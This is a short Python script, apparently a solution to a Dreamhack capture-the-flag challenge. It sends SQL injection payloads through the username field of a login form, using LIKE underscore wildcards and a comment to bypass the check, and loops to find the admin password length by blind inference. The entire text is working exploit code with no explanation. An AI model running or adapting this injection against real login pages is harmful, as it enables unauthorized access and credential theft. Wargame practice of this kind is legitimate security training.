import requests

url = "http://host3.dreamhack.games:16705/login"

for i in range(1, 100):
    payload = "Rootsquare' && password like '" + "_" * i + "' #"
    data = {"username": payload, "password": "aaa"}
    r = requests.post(url, data=data)

    if "Invalid" not in r.text and "No Hack" not in r.text:
        print(f"[+] password length = {i}")
        break
    else:
        print(f"[-] tried length {i}")